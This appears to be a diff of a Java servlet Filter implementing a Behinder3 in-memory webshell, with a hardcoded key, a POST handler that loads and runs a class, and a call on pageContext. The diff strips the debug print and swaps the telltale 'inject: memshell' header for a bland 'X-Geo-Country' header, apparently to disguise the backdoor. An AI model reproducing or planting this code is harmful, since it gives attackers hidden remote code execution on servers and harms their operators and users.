@@ -7,18 +7,19 @@ import java.io.IOException;
 import java.lang.reflect.Method;
 
 /**
+ * Behinder3 beta11
  * created by 0x22cb7139 on 2021/6/16
  */
+
 public class CustomFilter implements Filter {
     @Override
     public void init(FilterConfig filterConfig) throws ServletException {
-        System.out.println("Filter初始化创建");
     }
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         HttpServletRequest req = (HttpServletRequest) servletRequest;
         HttpServletResponse rsp = (HttpServletResponse) servletResponse;
-        rsp.setHeader("inject","memshell");
+        rsp.setHeader("X-Geo-Country","*");
         try {
             if (req.getMethod().equals("POST")) {
                 String k = "f5d7aa3ba4929cc1";
@@ -38,6 +39,7 @@ public class CustomFilter implements Filter {
                 Object a = clazz.newInstance();
                 a.equals(pageContext);
                 return;
+
             }
         } catch (Exception e) {
             e.printStackTrace();
